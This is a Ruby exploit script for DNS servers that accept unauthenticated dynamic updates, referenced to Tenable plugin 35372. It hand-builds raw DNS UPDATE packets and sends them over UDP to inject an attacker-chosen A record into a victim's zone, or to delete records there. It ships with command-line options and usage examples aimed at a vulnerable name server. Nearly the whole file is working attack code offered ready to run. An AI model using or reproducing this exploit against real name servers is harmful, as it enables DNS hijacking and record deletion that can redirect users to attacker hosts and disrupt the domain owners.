#!/usr/bin/env ruby
#
# DNS Server Dynamic Update Record Injection
# Exploit for Tenable plugin: 35372
# KING SABRI | @KINGSABRI
#
require 'optparse'
require 'socket'

class String
  def domain_to_raw
    self.split('.').map do |part| 
      part_size  = '%02x' % part.size
      domain2hex = part.each_byte.map{|byte| '%02x' %  byte}.join
      part_size + domain2hex
    end.join.scan(/../).map { |x| x.hex.chr }.join
  end
  
  def ip_to_hex
    self.split(".").map(&:to_i).pack("C*")
  end
end


def update_A_record(action, domain, attacker_domain, attacker_ip)
  
  case
  when action == :add
    _type    = "\x00\x01"           # Type: A (Host Address (0x01)
    _class   = "\x00\x01"           # Class: IN (0x0001)
    _ttl     = "\x00\x00\x00\x78"   # Time to live (120)
    _datalen = "\x00\x04"           # Data length (0x0000)
  when action == :del
    _type    = "\x00\xff"           # Type: A request for all records (0x00ff)
    _class   = "\x00\xff"           # Class: ANY (0x00ff)
    _ttl     = "\x00\x00\x00\x00"   # Time to live (0x0000)
    _datalen = "\x00\x00"           # Data length (0x0000)
  end
  
  
  #
  # Dynamic Update Query builder 
  #
  
  # Transaction ID: 0x0000
  "\x00\x00" +
  # Flags: 0x2800 Dynamic update
  "\x28\x00" +
  # Zones: 1
  "\x00\x01" +
  # Prerequisites: 0
  "\x00\x00" +
  # Updates: 1
  "\x00\x01" +
  # Additional RRs: 0
  "\x00\x00" +
  # Zone 
  #   <DOMAIN>: type SOA, class IN
  #   Name: <DOMAIN> & [Name Length: 8] & [Label Count: 2]
  domain.domain_to_raw + "\x00" +  
  #   Type: SOA (Start Of a zone of Authority) (6)
  "\x00\x06" +
  #   Class: IN (0x0001)
  "\x00\x01" +
  
  # Updates
  #   <ATTACKER_DOMAIN>: type A, class IN, addr <ATTACKER_DOMAIN>
  #   Name: <ATTACKER_DOMAIN>
  attacker_domain.domain_to_raw + "\x00" + 
  #   Type: _type
  _type + 
  #   Class: _class
  _class + 
  #   Time to live: _ttl
  _ttl + 
  #   Data length: _datalen
  _datalen +
  #   Address: <ATTACKER_IP>
  attacker_ip.ip_to_hex
  
end


options = {}
parser = OptionParser.new do |opts|
  opts.banner = "Usage: #{$0} [options]"
  
  opts.on("--add", "Add 'A' record to the vulnerable name server.") { |a| options[:add] = a }
  opts.on("--del", "Delete 'A' record to the vulnerable name server.")  { options[:delete] = true}
  opts.on("--inj-domain ATTACKER_DOMAIN", "Attacker's Domain name to create an A record for. ex. attacker.domain.com") { |a| options[:injdomin] = a }
  opts.on("--inj-ip ATTACKER_IP", "Attacker's IP Address the new record will point to.") { |a| options[:injip] = a }
  opts.on("-d DOMAIN", "--domain DOMAIN", "The domain your will inject to. ex. domain.com") { |a| options[:domain] = a  }
  opts.on("-n NS_SERVER", "--nameserver NS_SERVER", "The vulnerable server domain name or IP. ex. vuln-ns1.domain.com") { |a| options[:ns] = a  }
  opts.on("-h", "--help", "Display this help") { opts}
  
  opts.separator "Example:"
  opts.separator "ruby #{__FILE__} --add --inj-domain attacker.domain.com --inj-ip 192.168.1.10 --domain domain.com --nameserver vuln-ns1.domain.com"
  opts.separator "ruby #{__FILE__} --del --inj-domain attacker.domain.com --inj-ip 192.168.1.10 --domain domain.com --nameserver vuln-ns1.domain.com"
  
end

parser.parse!
ARGV

usocket = UDPSocket.new
usocket.connect(options[:ns], 53)

case 
when options[:add]
  usocket.send(update_A_record(:add, options[:domain], options[:injdomin], options[:injip]), 0)
  puts ""
  puts "[+] The Domain '#{options[:injdomin]}' => '#{options[:injip]}' has been injected in #{options[:domain]}"
  puts ""
when options[:delete]
  usocket.send(update_A_record(:del, options[:domain], options[:injdomin], options[:injip]), 0)
  puts ""
  puts "[+] The Domain '#{options[:injdomin]}' has been deleted from #{options[:domain]}"
  puts ""
else
  puts parser
end


